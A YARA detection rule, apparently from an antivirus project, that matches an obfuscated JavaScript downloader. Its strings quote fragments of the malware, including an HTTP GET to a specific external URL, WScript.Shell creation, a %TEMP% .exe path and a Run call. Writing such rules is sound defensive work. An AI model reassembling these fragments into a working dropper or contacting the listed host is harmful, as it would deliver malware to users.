rule sig_20160401_7c8ed2064200901d0f3e7d04dd028cba {
  meta:
    description = "datamaliciousorder - file 20160401_7c8ed2064200901d0f3e7d04dd028cba.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2168d951b678f3debad770acd744e5e41e2999de1361980f2ad362b041a56caf"

  strings:
    $s1  = "RiGx[FbxYgk](\"G\" + \"ET\", \"http://xn--as-wqa.org.pl/s0olau\", false);" fullword ascii
    $s2  = "function AaYwh(CcnEz, EuGil){MfyLg = MfyLg * 1; return CcnEz - EuGil;};" fullword ascii
    $s3  = "var HnvIl = function UwtQr() {return WScript[HgNxi](\"WScript\"+\".Shell\");}(), BrcHl = 11;" fullword ascii
    $s4  = "if (RiGx[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function HzjBu(){return WriUh + \"\";};" fullword ascii
    $s6  = "function LvaBnh() {return HnvIl[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"3cTH3G2VHmf4v.ex\" + \"e\";};" fullword ascii
    $s7  = "function CjVun() {return ((GoFc == true) && (GoFc == DwgJh)) ? 1 : MfyLg;};" fullword ascii
    $s8  = "var GoFc = false;" fullword ascii
    $s9  = "var DwgJh = false;" fullword ascii
    $s10 = "GoFc = true; " fullword ascii
    $s11 = "function PvwYk(KkYtg) {var BhkOu = (1, 2, 3, 4, 5, KkYtg); return BhkOu;};" fullword ascii
    $s12 = "DwgJh = true; " fullword ascii
    $s13 = "function YfAf(){return HgNxi;};" fullword ascii
    $s14 = "function JfNt()" fullword ascii
    $s15 = "return AaYwh(IcnDhu, HajPpe);" fullword ascii
    $s16 = "var ScrCjy = new this[\"Date\"]();" fullword ascii
    $s17 = "function FcgRsb(){return 23;};" fullword ascii
    $s18 = "}while (EbGd);" fullword ascii
    $s19 = "var LtJk = false;" fullword ascii
    $s20 = "function WfuTpr(NbJoe){HnvIl[\"R\"+\"un\"](NbJoe, MfyLg, MfyLg);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}